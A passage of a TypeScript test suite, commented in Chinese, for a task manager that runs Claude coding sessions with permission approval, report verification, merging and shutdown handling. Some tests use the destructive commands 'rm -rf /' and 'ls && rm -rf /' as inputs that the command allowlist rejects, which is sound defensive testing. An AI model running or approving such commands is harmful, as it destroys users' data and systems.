    await tm.send(id, 'main', '順便改錯誤訊息')
    expect(claude.calls.length).toBe(before)
    release()
    await tm.whenIdle(id)
    expect(
      (await tm.timeline(id)).filter((e) => e.kind === 'user_text').map((e) => e.text)
    ).toContain('順便改錯誤訊息')
  })

  test('init 把執行中的任務標為中斷；resume 送出 [resume]', async () => {
    const { tm, claude, repo } = await setup()
    const { makeTask } = await import('../fixtures/task')
    await repo.saveTask(makeTask({ id: 'x', runState: 'running', mainSessionId: 's9' }))
    await tm.init()
    expect(tm.get('x').runState).toBe('interrupted')
    await tm.resume('x')
    await tm.whenIdle('x')
    expect(claude.calls.at(-1)).toMatchObject({
      prompt: expect.stringContaining('[resume]'),
      options: { resume: 's9' }
    })
    expect(tm.get('x').runState).toBe('idle')
  })
})

async function toImplementing(over: Partial<TaskManagerDeps> = {}) {
  const ctx = await setup(over)
  ctx.claude.script = async ({ call, sink }) => {
    if (call === 0) await sink.proposeSpec(spec)
  }
  const id = await ctx.create()
  ctx.claude.script = async () => []
  await ctx.tm.approveSpec(id)
  await ctx.tm.whenIdle(id)
  return { ...ctx, id }
}

describe('TaskManager：報告與收尾', () => {
  test('submit_report → commit、diff、驗證、存報告、進入 reviewing', async () => {
    const { tm, claude, verify, repo, id } = await toImplementing()
    // 實作中核准過 npm test，之後提交報告
    claude.script = async ({ options, sink }) => {
      await options.canUseTool!('Bash', { command: 'npm test' }, signalOf())
      await sink.submitReport(sampleReport)
    }
    await tm.send(id, 'main', '完成了嗎？')
    await until(() => !!tm.get(id).pendingPermission)
    await tm.resolvePermission(id, tm.get(id).pendingPermission!.id, { allow: true })
    await tm.whenIdle(id)
    const t = tm.get(id)
    expect(t).toMatchObject({ status: 'reviewing', runState: 'idle', reportVersions: [1] })
    const r = await repo.getReport(id, 1)
    expect(r).toMatchObject({ version: 1, commit: 'abc123', stats: { files: 1 } })
    expect(await tm.getReport(id, 1)).toEqual(r)
    expect(verify).toHaveBeenCalledWith(
      t.worktreePath,
      ['npm test'],
      expect.any(Function),
      expect.any(AbortSignal)
    )
    const isAllowed = verify.mock.calls[0][2]
    expect(isAllowed('npm test')).toBe(true)
    expect(isAllowed('git status')).toBe(true) // 全域允許清單
    expect(isAllowed('rm -rf /')).toBe(false)
    expect(isAllowed('ls && rm -rf /')).toBe(false) // 串接的指令不套用樣式（ls * 在允許清單中）
    expect((await tm.timeline(id)).at(-1)).toMatchObject({ kind: 'report', ref: '1' })
  })

  test('同一輪重複提交報告會被拒絕', async () => {
    const { tm, claude, id } = await toImplementing()
    let error: unknown
    claude.script = async ({ sink }) => {
      await sink.submitReport(sampleReport)
      await Promise.resolve(sink.submitReport(sampleReport)).catch((e: unknown) => {
        error = e
      })
    }
    await tm.send(id, 'main', '完成')
    await tm.whenIdle(id)
    expect(String(error)).toContain('正在整理')
    expect(tm.get(id).reportVersions).toEqual([1])
  })

  test('整理報告失敗時記錄錯誤', async () => {
    const { tm, claude, git, id } = await toImplementing()
    git.commitAll = async () => {
      throw new Error('pre-commit hook failed')
    }
    claude.script = async ({ sink }) => {
      await sink.submitReport(sampleReport)
    }
    await tm.send(id, 'main', '完成')
    await tm.whenIdle(id)
    expect(tm.get(id)).toMatchObject({
      status: 'implementing',
      runState: 'error',
      error: '整理報告失敗：pre-commit hook failed'
    })
  })

  test('提交的報告先存在任務上（整理中斷或失敗時可重試）；整理完成後清掉', async () => {
    let release!: () => void
    const verify = vi.fn<TaskManagerDeps['verify']>(async (_cwd, commands) => {
      await new Promise<void>((r) => (release = r))
      return commands.map((command) => ({ command, exitCode: 0, durationMs: 1, outputTail: 'ok' }))
    })
    const { tm, claude, repo, id } = await toImplementing({ verify })
    claude.script = async ({ sink }) => {
      await sink.submitReport(sampleReport)
    }
    await tm.send(id, 'main', '完成')
    await until(() => verify.mock.calls.length === 1)
    const saved = (await repo.listTasks()).find((t) => t.id === id)!
    expect(saved).toMatchObject({
      runState: 'finalizing',
      pendingReport: { input: sampleReport, commit: 'abc123' }
    })
    release()
    await tm.whenIdle(id)
    expect(tm.get(id)).toMatchObject({ status: 'reviewing', reportVersions: [1] })
    expect(tm.get(id).pendingReport).toBeUndefined()
  })

  test('關閉 app 時整理被中斷：重新啟動後「繼續」直接重新整理報告，不再呼叫 Claude', async () => {
    const verify = vi.fn<TaskManagerDeps['verify']>(async (_cwd, commands, _ok, signal) => {
      await new Promise((r) => signal!.addEventListener('abort', r, { once: true }))
      return commands.map((command) => ({ command, exitCode: null, durationMs: 1, outputTail: '' }))
    })
    const { tm, claude, git, repo, id } = await toImplementing({ verify })
    // 第一次整理已經 commit 了；重試時沒有新的變更（commitAll 回傳 null）就沿用那個 commit
    git.commitAll = vi
      .fn<typeof git.commitAll>()
      .mockResolvedValueOnce('abc123')
      .mockResolvedValue(null)
    claude.script = async ({ sink }) => {
      await sink.submitReport(sampleReport)
    }
    await tm.send(id, 'main', '完成')
    await until(() => verify.mock.calls.length === 1)
    await tm.shutdown(3000)
    expect(tm.get(id)).toMatchObject({ runState: 'interrupted', reportVersions: [] })

    // 重新啟動
    const claude2 = new FakeClaude()
    const verify2 = vi.fn<TaskManagerDeps['verify']>(async (_cwd, commands) =>
      commands.map((command) => ({ command, exitCode: 0, durationMs: 1, outputTail: 'ok' }))
    )
    const tm2 = new TaskManager({
      repo,
      git,
      queryFn: claude2.queryFn,
      createToolServer: claude2.createToolServer,
      getClaudePath: () => '/bin/claude',
      emit: () => {},
      verify: verify2,
      now: () => '2026-10-07T11:00:00.000Z'
    })
    await tm2.init()
    expect(tm2.get(id)).toMatchObject({
      runState: 'interrupted',
      pendingReport: { input: sampleReport, commit: 'abc123' }
    })
    await tm2.resume(id)
    await tm2.whenIdle(id)
    expect(claude2.calls).toHaveLength(0)
    expect(verify2).toHaveBeenCalledTimes(1)
    expect(tm2.get(id)).toMatchObject({
      status: 'reviewing',
      runState: 'idle',
      error: undefined,
      reportVersions: [1]
    })
    expect(tm2.get(id).pendingReport).toBeUndefined()
    expect(await repo.getReport(id, 1)).toMatchObject({ input: sampleReport, commit: 'abc123' })
    expect(claude.calls.at(-1)!.prompt).toBe('完成')
  })

  test('commit 失敗：顯示錯誤、保留報告；「繼續」重試整理，不再呼叫 Claude', async () => {
    const { tm, claude, git, id } = await toImplementing()
    let fail = true
    git.commitAll = async () => {
      if (fail) throw new Error('git commit 失敗：執行逾時（超過 120 秒），已終止')
      return 'def456'
    }
    claude.script = async ({ sink }) => {
      await sink.submitReport(sampleReport)
    }
    await tm.send(id, 'main', '完成')
    await tm.whenIdle(id)
    expect(tm.get(id)).toMatchObject({
      status: 'implementing',
      runState: 'error',
      error: '整理報告失敗：git commit 失敗：執行逾時（超過 120 秒），已終止',
      pendingReport: { input: sampleReport }
    })
    const calls = claude.calls.length
    fail = false
    await tm.resume(id)
    await tm.whenIdle(id)
    expect(claude.calls).toHaveLength(calls)
    expect(tm.get(id)).toMatchObject({
      status: 'reviewing',
      runState: 'idle',
      error: undefined,
      reportVersions: [1]
    })
    expect((await tm.getReport(id, 1)).commit).toBe('def456')
  })

  test('整理失敗後改為繼續和 Claude 對話：放棄待整理的報告，之後的「繼續」照常續接 Claude', async () => {
    const { tm, claude, git, id } = await toImplementing()
    git.commitAll = async () => {
      throw new Error('boom')
    }
    claude.script = async ({ sink }) => {
      await sink.submitReport(sampleReport)
    }
    await tm.send(id, 'main', '完成')
    await tm.whenIdle(id)
    expect(tm.get(id).pendingReport).toBeDefined()
    claude.script = async () => {
      throw new Error('CLI crashed')
    }
    await tm.send(id, 'main', '先看一下為什麼失敗')
    await tm.whenIdle(id)
    expect(tm.get(id).pendingReport).toBeUndefined()
    expect(tm.get(id).runState).toBe('error')
    claude.script = async () => []
    await tm.resume(id)
    await tm.whenIdle(id)
    expect(claude.calls.at(-1)!.prompt).toContain('[resume]')
  })

  test('回饋 → implementing，送出 [report_feedback]；再次提交產生 v2', async () => {
    const { tm, claude, id } = await toImplementing()
    claude.script = async ({ sink }) => {
      await sink.submitReport(sampleReport)
    }
    await tm.send(id, 'main', '完成')
    await tm.whenIdle(id)
    await tm.submitReportFeedback(id, [{ anchor: 'diff:a.ts:3', label: 'a.ts:3', text: '改常數' }])
    await tm.whenIdle(id)
    expect(claude.calls.at(-1)!.prompt).toBe('[report_feedback] - (diff:a.ts:3) 改常數')
    const feedback = (await tm.timeline(id)).filter((e) => e.kind === 'user_text').at(-1)!
    expect(feedback).toMatchObject({
      text: msgDisplay.reportFeedback(1, false),
      ref: IMPLEMENT_START_REF
    })
    expect(tm.get(id).reportVersions).toEqual([1, 2])
    expect(tm.get(id).status).toBe('reviewing')
  })

  test('只有整體意見的回饋顯示「送出整體意見」', async () => {
    const { tm, claude, id } = await toImplementing()
    claude.script = async ({ sink }) => {
      await sink.submitReport(sampleReport)
    }
    await tm.send(id, 'main', '完成')
    await tm.whenIdle(id)
    claude.script = async () => []
    await tm.submitReportFeedback(id, [], '命名再一致一點')
    await tm.whenIdle(id)
    expect((await tm.timeline(id)).filter((e) => e.kind === 'user_text').at(-1)).toMatchObject({
      text: '送出整體意見',
      ref: IMPLEMENT_START_REF
    })
  })

  test('開 PR 與合併都會結束任務', async () => {
    const { tm, claude, git, id } = await toImplementing()
    claude.script = async ({ sink }) => {
      await sink.submitReport(sampleReport)
    }
    await tm.send(id, 'main', '完成')
    await tm.whenIdle(id)
    expect(await tm.createPullRequest(id)).toBe('https://github.com/me/shop-api/pull/1')
    expect(git.calls.at(-1)).toBe(`pr ${tm.get(id).branch} main 帳號鎖定`)
    expect(tm.get(id)).toMatchObject({
      status: 'done',
      prUrl: 'https://github.com/me/shop-api/pull/1'
    })
    await expect(tm.merge(id)).rejects.toThrow()
    expect(git.calls.some((c) => c.startsWith('merge'))).toBe(false)
  })

  test('合併到 base branch', async () => {
    const { tm, claude, git, id } = await toImplementing()
    claude.script = async ({ sink }) => {
      await sink.submitReport(sampleReport)
    }
    await tm.send(id, 'main', '完成')
    await tm.whenIdle(id)
    await tm.merge(id)
    expect(git.calls.at(-1)).toBe(`merge ${tm.get(id).branch} main`)
    expect(tm.get(id).status).toBe('done')
  })

  test('丟棄會停止執行並移除 worktree', async () => {
    const { tm, claude, git, id } = await toImplementing()
    claude.script = async () => {
      await new Promise(() => undefined) // 卡住，直到被中止
    }
    await tm.send(id, 'main', '繼續')
    await until(() => tm.get(id).runState === 'running')
    await tm.discard(id)
    await tm.whenIdle(id)
    expect(tm.get(id)).toMatchObject({ status: 'discarded', runState: 'idle' })
    expect(tm.get(id).error).toBeUndefined()
    expect(git.calls.at(-1)).toBe(`remove ${tm.get(id).worktreePath} ${tm.get(id).branch}`)
    await expect(tm.send(id, 'main', 'hi')).rejects.toThrow('任務已結束')
    await tm.discard(id) // 再丟棄一次也不會出錯
    expect(tm.get(id).status).toBe('discarded')
  })
})

/** 可以從外部放行的 promise */
function deferred<T = void>() {
  let resolve!: (v: T) => void
  const promise = new Promise<T>((r) => {
    resolve = r
  })
  return { promise, resolve }
}

async function toReviewing(over: Partial<TaskManagerDeps> = {}) {
  const ctx = await setup(over)
  ctx.claude.script = async ({ call, sink }) => {
    if (call === 0) await sink.proposeSpec(spec)
    if (call === 2) await sink.submitReport(sampleReport)
  }
  const id = await ctx.create()
  await ctx.tm.approveSpec(id)
  await ctx.tm.whenIdle(id)
  await ctx.tm.send(id, 'main', '完成')
  await ctx.tm.whenIdle(id)
  expect(ctx.tm.get(id).status).toBe('reviewing')
  ctx.claude.script = async () => []
  return { ...ctx, id }
}

describe('TaskManager：狀態一致性', () => {
  test('get() 回傳複本，改動不影響內部狀態', async () => {
    const { tm, create } = await setup()
    const id = await create()
    tm.get(id).approvedCommands.push('rm -rf /')
    expect(tm.get(id).approvedCommands).toEqual([])
  })

  test('閒置後不留下串接用的 promise', async () => {
    const { tm, claude, create } = await setup()
    claude.script = async () => [assistantText('好')]
    const id = await create()
    await tm.send(id, 'main', '再一次')
    await tm.whenIdle(id)
    await new Promise((r) => setTimeout(r, 0))
    const internals = tm as unknown as Record<string, Map<string, unknown>>
    for (const name of ['chains', 'saves', 'timelineWrites', 'turnLocks']) {
      expect(internals[name].size, name).toBe(0)
    }
  })

  test('開 PR 期間拒絕其他收尾與改變狀態的操作', async () => {
    const { tm, git, id } = await toReviewing()
    const push = deferred<string>()
    git.pushAndOpenPr = () => push.promise
    const pr = tm.createPullRequest(id)
    await expect(tm.merge(id)).rejects.toThrow('收尾')
    await expect(tm.discard(id)).rejects.toThrow('收尾')
    await expect(tm.createPullRequest(id)).rejects.toThrow('收尾')
    await expect(
      tm.submitReportFeedback(id, [{ anchor: 'a', label: 'a', text: '改' }])
    ).rejects.toThrow('收尾')
    await expect(tm.send(id, 'main', '還有一件事')).rejects.toThrow('收尾')
    await expect(tm.openBranch(id, { title: 't' })).rejects.toThrow('收尾')
    expect(tm.get(id).status).toBe('reviewing')
    push.resolve('https://github.com/me/shop-api/pull/2')
    expect(await pr).toBe('https://github.com/me/shop-api/pull/2')
    expect(tm.get(id)).toMatchObject({
      status: 'done',
      prUrl: 'https://github.com/me/shop-api/pull/2'
    })
  })

  test('合併期間拒絕規格與卡片操作', async () => {
    const { tm, git, id } = await toReviewing()
    const merging = deferred()
    git.merge = () => merging.promise
    const m = tm.merge(id)
    await expect(tm.approveSpec(id)).rejects.toThrow('收尾')
    await expect(tm.requestSpecChanges(id, '改')).rejects.toThrow('收尾')
    await expect(tm.answerQuestion(id, 'q1', { text: 'x' })).rejects.toThrow('收尾')
    await expect(tm.counterQuestion(id, 'q1', 'x')).rejects.toThrow('收尾')
    merging.resolve()
    await m
    expect(tm.get(id).status).toBe('done')
  })

  test('開新一輪失敗時還原狀態，也不寫入時間軸', async () => {
    const { tm, claude, create } = await setup()
    claude.script = async ({ call, sink }) => {
      if (call === 0) await sink.proposeSpec(spec)
    }
    const id = await create()
    const before = (await tm.timeline(id)).length

    claude.failNextQuery = new Error('spawn failed')
    await expect(tm.approveSpec(id)).rejects.toThrow('spawn failed')
    expect(tm.get(id).status).toBe('spec_review')

    claude.failNextQuery = new Error('spawn failed')
    await expect(tm.requestSpecChanges(id, '改')).rejects.toThrow('spawn failed')
    expect(tm.get(id).status).toBe('spec_review')

    claude.failNextQuery = new Error('spawn failed')
    await expect(tm.openBranch(id, { title: 't' })).rejects.toThrow('spawn failed')
    expect(tm.get(id).branches).toEqual([])

    claude.failNextQuery = new Error('spawn failed')
    await expect(tm.send(id, 'main', '哈囉')).rejects.toThrow('spawn failed')
    expect(await tm.timeline(id)).toHaveLength(before)
    expect(tm.get(id).runState).toBe('idle')
  })

  test('回饋送出失敗時回到 reviewing', async () => {
    const { tm, claude, id } = await toReviewing()
    claude.failNextQuery = new Error('spawn failed')
    await expect(
      tm.submitReportFeedback(id, [{ anchor: 'a', label: 'a', text: '改' }])
    ).rejects.toThrow('spawn failed')
    expect(tm.get(id).status).toBe('reviewing')
  })

  test('回答或反問送出失敗時還原卡片', async () => {
    const { tm, claude, create } = await setup()
    claude.script = async ({ call, sink }) => {
      if (call === 0) await sink.askUser(askQ1)
    }
    const id = await create()
    claude.failNextQuery = new Error('spawn failed')
    await expect(tm.answerQuestion(id, 'q1', { optionId: 'acct' })).rejects.toThrow()
    expect(tm.get(id).questions[0]).toMatchObject({ status: 'open', answer: undefined })
    claude.failNextQuery = new Error('spawn failed')
    await expect(tm.counterQuestion(id, 'q1', '為什麼？')).rejects.toThrow()
    expect(tm.get(id).questions[0].followups).toEqual([])
    // 反問失敗後的一般回覆不應被當成反問的答案
    claude.script = async () => [assistantText('一般回覆')]
    await tm.send(id, 'main', '繼續')
    await tm.whenIdle(id)
    expect(tm.get(id).questions[0].followups).toEqual([])
    expect((await tm.timeline(id)).at(-1)).toMatchObject({ kind: 'assistant_text' })
  })

  test('整理報告期間拒絕主線訊息；成功後清除舊錯誤', async () => {
    const verifying = deferred()
    const { tm, claude, verify, id } = await toImplementing()
    claude.script = async () => [{ type: 'result', subtype: 'error_during_execution' }]
    await tm.send(id, 'main', '先失敗一次')
    await tm.whenIdle(id)
    expect(tm.get(id).error).toBe('執行時發生錯誤') // turn_end 失敗（不是丟出例外）也記錄錯誤
    expect(tm.get(id).runState).toBe('error')

    verify.mockImplementationOnce(async () => {
      await verifying.promise
      return []
    })
    // 同一輪裡提交報告後又回報失敗：整理報告成功後應清掉這個錯誤
    claude.script = async ({ sink }) => {
      await sink.submitReport(sampleReport)
      return [{ type: 'result', subtype: 'error_during_execution' }]
    }
    await tm.send(id, 'main', '完成')
    await until(() => tm.get(id).runState === 'finalizing' && verify.mock.calls.length > 0)
    await expect(tm.send(id, 'main', '等等')).rejects.toThrow('正在整理報告')
    verifying.resolve()
    await tm.whenIdle(id)
    expect(tm.get(id)).toMatchObject({ status: 'reviewing', runState: 'idle' })
    expect(tm.get(id).error).toBeUndefined()
  })

  test('執行結束時拒絕還在等待的核准', async () => {
    const { tm, claude, id } = await toImplementing()
    let result: Promise<unknown> | undefined
    claude.script = async ({ options }) => {
      // 不等核准就結束這一輪（模擬 SDK 沒有取消 canUseTool 就結束）
      result = Promise.resolve(options.canUseTool!('Bash', { command: 'npm test' }, signalOf()))
      await until(() => !!tm.get(id).pendingPermission)
    }
    await tm.send(id, 'main', '跑測試')
    await tm.whenIdle(id)
    expect(await result).toMatchObject({ behavior: 'deny', message: '執行已結束' })
    expect(tm.get(id).pendingPermission).toBeUndefined()
    expect(tm.get(id).runState).toBe('idle')
  })

  test('丟棄會拒絕等待中的核准', async () => {
    const { tm, claude, id } = await toImplementing()
    let result: unknown
    claude.script = async ({ options }) => {
      result = await options.canUseTool!('Bash', { command: 'npm test' }, signalOf())
      await new Promise(() => undefined)
    }
    await tm.send(id, 'main', '跑測試')
    await until(() => !!tm.get(id).pendingPermission)
    await tm.discard(id)
    await tm.whenIdle(id)
    expect(result).toMatchObject({ behavior: 'deny', message: '任務已丟棄' })
    expect(tm.get(id)).toMatchObject({ status: 'discarded', runState: 'idle' })
    expect(tm.get(id).pendingPermission).toBeUndefined()
  })

  test('停止分岔不影響主線', async () => {
    const { tm, claude, create } = await setup()
    const id = await create()
    claude.script = async () => {
      await new Promise(() => undefined)
    }
    const b = await tm.openBranch(id, { title: '討論' })
    await until(() => tm.get(id).branches[0].running)
    await tm.stop(id, `branch:${b.id}`)
    await tm.whenIdle(id)
    expect(tm.get(id).branches[0].running).toBe(false)
    expect(tm.get(id)).toMatchObject({ runState: 'idle' })
    expect(tm.get(id).error).toBeUndefined()
    // 「已停止」記在分岔自己的時間軸
    const stopped = (await tm.timeline(id)).filter((e) => e.kind === 'system')
    expect(stopped.map((e) => e.channel)).toEqual([`branch:${b.id}`])
  })

  test('沒有 session 的中斷任務：resume 重新送出需求', async () => {
    const { tm, claude, repo } = await setup()
    const { makeTask } = await import('../fixtures/task')
    await repo.saveTask(makeTask({ id: 'x', runState: 'interrupted' }))
    await tm.init()
    await tm.resume('x')
    await tm.whenIdle('x')
    expect(claude.calls.at(-1)!.prompt).toBe('加上登入失敗鎖定')
    expect(claude.calls.at(-1)!.options.resume).toBeUndefined()
  })

  test('init 清掉殘留的核准請求與分岔執行狀態', async () => {
    const { tm, repo } = await setup()
    const { makeTask } = await import('../fixtures/task')
    await repo.saveTask(
      makeTask({
        id: 'x',
        runState: 'idle',
        pendingPermission: {
          id: 'p1',
          taskId: 'x',
          channel: 'main',
          toolName: 'Bash',
          input: { command: 'ls' },
          createdAt: 'x'
        },
        branches: [{ id: 'b1', title: 't', status: 'open', running: true, createdAt: 'x' }]
      })
    )
    await tm.init()
    expect(tm.get('x').runState).toBe('idle')
    expect(tm.get('x').pendingPermission).toBeUndefined()
    expect(tm.get('x').branches[0].running).toBe(false)
    expect((await repo.listTasks()).find((t) => t.id === 'x')!.branches[0].running).toBe(false)
  })
})

describe('TaskManager：上一段執行卡住', () => {
  test('等太久就中止上一段執行，再開新的一輪', async () => {
    const { tm, claude, create } = await setup({ prevRunTimeoutMs: 50 })
    const id = await create()
    claude.afterResult = 'hang'
    await tm.send(id, 'main', '第一輪')
    await until(() => claude.results === 2) // 第一輪的 result 已處理，輸入已關閉
    claude.afterResult = undefined
    await tm.send(id, 'main', '第二輪')
    await tm.whenIdle(id)
    expect(claude.calls.map((c) => c.prompt).slice(-2)).toEqual(['第一輪', '第二輪'])
    expect(tm.get(id).runState).toBe('idle')
  })

  test('中止後仍不結束就拒絕送出', async () => {
    const { tm, claude, create } = await setup({ prevRunTimeoutMs: 50 })
    const id = await create()
    claude.afterResult = 'hang_ignoring_abort'
    await tm.send(id, 'main', '第一輪')
    await until(() => claude.results === 2) // 第一輪的 result 已處理，輸入已關閉
    claude.afterResult = undefined
    await expect(tm.send(id, 'main', '第二輪')).rejects.toThrow('上一輪尚未結束，請先停止')
    expect(claude.calls).toHaveLength(2)
    expect((await tm.timeline(id)).map((e) => e.text)).not.toContain('第二輪')
    // 卡住的執行已被丟掉：狀態回到 idle，whenIdle 不再等它，下一則訊息開新的一輪
    expect(tm.get(id).runState).toBe('idle')
    await tm.whenIdle(id)
    await tm.send(id, 'main', '第三輪')
    await tm.whenIdle(id)
    expect(claude.calls.map((c) => c.prompt).at(-1)).toBe('第三輪')
    claude.releaseHang()
  })

  test('丟棄時不理會 abort 的執行不會卡住', async () => {
    const { tm, claude, create } = await setup({ prevRunTimeoutMs: 50 })
    const id = await create()
    claude.afterResult = 'hang_ignoring_abort'
    await tm.send(id, 'main', '第一輪')
    await until(() => claude.results === 2)
    await tm.discard(id)
    expect(tm.get(id)).toMatchObject({ status: 'discarded', runState: 'idle' })
    await tm.whenIdle(id)
    claude.releaseHang()
  })

  test('等上一段執行期間任務被丟棄，就不再開新的一輪', async () => {
    const { tm, claude, create } = await setup({ prevRunTimeoutMs: 5000 })
    const id = await create()
    claude.afterResult = 'hang'
    await tm.send(id, 'main', '第一輪')
    await until(() => claude.results === 2) // 第一輪的 result 已處理，輸入已關閉
    claude.afterResult = undefined
    // 先接住結果：拒絕會在 discard() 進行中發生
    const sending = tm.send(id, 'main', '第二輪').then(
      () => 'sent',
      (e: unknown) => String(e)
    )
    await tm.discard(id)
    expect(await sending).toContain('收尾')
    expect(claude.calls).toHaveLength(2)
    await tm.whenIdle(id)
  })
})

describe('TaskManager：審查補強', () => {
  test('分岔與決策 id 取現有最大編號 + 1', async () => {
    const { tm, claude, repo } = await setup()
    const { makeTask } = await import('../fixtures/task')
    await repo.saveTask(
      makeTask({
        id: 'x',
        mainSessionId: 's1',
        branches: [
          {
            id: 'b2',
            title: '舊分岔',
            status: 'concluding',
            running: false,
            sessionId: 'f2',
            conclusion: { decision: '用 Redis', rationale: '多台', deferred: [] },
            createdAt: 'x'
          }
        ],
        decisions: [{ id: 'd2', text: '舊決策', source: { type: 'question', ref: 'q1' } }]
      })
    )
    await tm.init()
    claude.script = async () => []
    const b = await tm.openBranch('x', { title: '新分岔' })
    expect(b.id).toBe('b3')
    await tm.whenIdle('x')
    await tm.confirmBranch('x', 'b2')
    await tm.whenIdle('x')
    expect(tm.get('x').decisions.map((d) => d.id)).toEqual(['d2', 'd3'])
  })

  test('submit_report 存檔失敗時不會卡在 finalizing', async () => {
    const { tm, claude, repo, id } = await toImplementing()
    const save = repo.saveTask.bind(repo)
    const spy = vi.spyOn(repo, 'saveTask').mockImplementation(async (t) => {
      if (t.runState === 'finalizing') throw new Error('disk full')
      return save(t)
    })
    let error: unknown
    claude.script = async ({ sink }) => {
      await Promise.resolve(sink.submitReport(sampleReport)).catch((e: unknown) => {
        error = e
      })
    }
    await tm.send(id, 'main', '完成')
    await tm.whenIdle(id)
    spy.mockRestore()
    expect(String(error)).toContain('disk full')
    expect(tm.get(id)).toMatchObject({ status: 'implementing', runState: 'idle' })
    // 沒有殘留的整理中狀態：主線可以繼續送訊息
    await tm.send(id, 'main', '再試一次')
    await tm.whenIdle(id)
  })

  test('插話前再檢查一次：排隊期間開始收尾就拒絕', async () => {
    const { tm, claude, id } = await toImplementing()
    const started = deferred()
    claude.script = async () => {
      started.resolve()
      await new Promise(() => undefined) // 一直執行，直到被停止
    }
    await tm.send(id, 'main', '開始')
    // 等 script 真的開始跑（這段執行正在進行中），不靠輪詢與時間
    await started.promise
    expect(tm.get(id).runState).toBe('running')
    // 白箱：佔住主線的 turn lock，讓下一則訊息排隊
    const internals = tm as unknown as {
      chainOn: (
        m: Map<string, Promise<unknown>>,
        k: string,
        fn: () => Promise<void>
      ) => Promise<void>
      turnLocks: Map<string, Promise<unknown>>
      finishing: Set<string>
    }
    const gate = deferred()
    void internals.chainOn(internals.turnLocks, `${id}|main`, () => gate.promise)
    const sending = tm.send(id, 'main', '插話').then(
      () => 'sent',
      (e: unknown) => String(e)
    )
    internals.finishing.add(id)
    gate.resolve()
    expect(await sending).toContain('收尾')
    expect((await tm.timeline(id)).map((e) => e.text)).not.toContain('插話')
    internals.finishing.delete(id)
    await tm.stop(id, 'main')
    await tm.whenIdle(id)
  })
})

describe('TaskManager：關閉 app', () => {
  test('shutdown 中止所有執行、拒絕核准，主線標為中斷，之後拒絕新操作', async () => {
    const { tm, claude, id, repo } = await toImplementing()
    let result: PermissionResult | null | undefined
    claude.script = async () => {
      await new Promise(() => undefined) // 一直執行，直到被中止
    }
    await tm.openBranch(id, { title: '查資料' })
    await until(() => tm.get(id).branches[0]?.running === true)
    claude.script = async ({ options }) => {
      result = await options.canUseTool!('Bash', { command: 'npm test' }, signalOf())
      await new Promise(() => undefined)
    }
    await tm.send(id, 'main', '開始')
    await until(() => !!tm.get(id).pendingPermission)

    await tm.shutdown(2000) // 上限放寬：全部結束就會提早返回
    expect(result).toMatchObject({ behavior: 'deny' })
    const t = tm.get(id)
    expect(t.runState).toBe('interrupted')
    expect(t.pendingPermission).toBeUndefined()
    expect(t.branches[0].running).toBe(false)
    await expect(tm.send(id, 'main', '再一則')).rejects.toThrow('正在關閉')
    await expect(
      tm.createTask({ repoId: 'r1', request: 'x', baseBranch: 'main', model: 'claude-opus-5-5' })
    ).rejects.toThrow('正在關閉')
    // 寫進磁碟的狀態也是中斷，下次啟動可以「繼續」
    expect((await repo.listTasks()).find((x) => x.id === id)?.runState).toBe('interrupted')
  })

  test('shutdown 不會被不理會 abort 的執行卡住', async () => {
    const { tm, claude, create } = await setup()
    const id = await create()
    claude.afterResult = 'hang_ignoring_abort'
    await tm.send(id, 'main', '第一輪')
    await until(() => claude.results === 2)
    const started = Date.now()
    await tm.shutdown(100)
    // 卡住的執行永遠不會結束：只要沒有無限等待就算通過（上限寬鬆，避免機器忙時誤判）
    expect(Date.now() - started).toBeLessThan(3000)
    expect(tm.get(id).runState).toBe('interrupted')
    claude.releaseHang()
  })

  test('shutdown 中止進行中的驗證指令，報告不存檔，主線標為中斷', async () => {
    let seen: AbortSignal | undefined
    const verify = vi.fn<TaskManagerDeps['verify']>(async (_cwd, commands, _ok, signal) => {
      seen = signal
      await new Promise((r) => signal!.addEventListener('abort', r, { once: true }))
      return commands.map((command) => ({
        command,
        exitCode: null,
        durationMs: 1,
        outputTail: '[Harness] 已取消'
      }))
    })
    const { tm, claude, repo, id } = await toImplementing({ verify })
    claude.script = async ({ sink }) => {
      await sink.submitReport(sampleReport)
    }
    await tm.send(id, 'main', '完成')
    await until(() => verify.mock.calls.length === 1)
    const started = Date.now()
    await tm.shutdown(3000)
    // 驗證指令沒被中止的話會等滿上限
    expect(Date.now() - started).toBeLessThan(2500)
    expect(seen?.aborted).toBe(true)
    expect(tm.get(id)).toMatchObject({
      status: 'implementing',
      runState: 'interrupted',
      reportVersions: []
    })
    await expect(repo.getReport(id, 1)).rejects.toThrow()
  })

  test('shutdown 等進行中的合併完成（有上限）', async () => {
    const { tm, claude, git, id } = await toImplementing()
    claude.script = async ({ sink }) => {
      await sink.submitReport(sampleReport)
    }
    await tm.send(id, 'main', '完成')
    await tm.whenIdle(id)
    const merge = git.merge
    git.merge = async (...a) => {
      await new Promise((r) => setTimeout(r, 150))
      await merge(...a)
    }
    const merging = tm.merge(id)
    await tm.shutdown(3000) // 合併一完成就返回；上限放寬避免機器忙時誤判
    expect(tm.get(id).status).toBe('done')
    await merging
  })

  test('沒有執行時 shutdown 立即結束，閒置任務狀態不變', async () => {
    const { tm, create } = await setup()
    const id = await create()
    await tm.shutdown(100)
    expect(tm.get(id).runState).toBe('idle')
  })
})

describe('TaskManager：分岔的錯誤', () => {
  test('分岔執行丟出錯誤記在分岔上，不影響主線；再送訊息就清除', async () => {
    const { tm, claude, create } = await setup()
    const id = await create()
    claude.script = async () => {
      throw new Error('CLI crashed')
    }
    const b = await tm.openBranch(id, { title: '討論' })
    await tm.whenIdle(id)
    expect(tm.get(id).branches[0]).toMatchObject({ running: false, error: 'CLI crashed' })
    expect(tm.get(id).error).toBeUndefined()
    expect(tm.get(id).runState).toBe('idle')

    claude.script = async () => [assistantText('好')]
    await tm.send(id, `branch:${b.id}`, '再試一次')
    await tm.whenIdle(id)
    expect(tm.get(id).branches[0].error).toBeUndefined()
    expect(tm.get(id).error).toBeUndefined()
  })

  test('訂閱額度用盡：時間軸顯示限制資訊，任務標為發生錯誤，「繼續」以 resume 續接', async () => {
    const { tm, claude, create } = await setup()
    const id = await create()
    claude.script = async () => [
      {
        type: 'rate_limit_event',
        rate_limit_info: { status: 'rejected', rateLimitType: 'five_hour' }
      },
      {
        type: 'assistant',
        parent_tool_use_id: null,
        error: 'rate_limit',
        message: { content: [] }
      },
      {
        type: 'result',
        subtype: 'success',
        is_error: true,
        result: 'Claude AI usage limit reached'
      }
    ]
    await tm.send(id, 'main', '繼續做')
    await tm.whenIdle(id)
    expect(tm.get(id)).toMatchObject({ runState: 'error', error: 'Claude AI usage limit reached' })
    const notices = (await tm.timeline(id)).filter((e) => e.kind === 'system').map((e) => e.text)
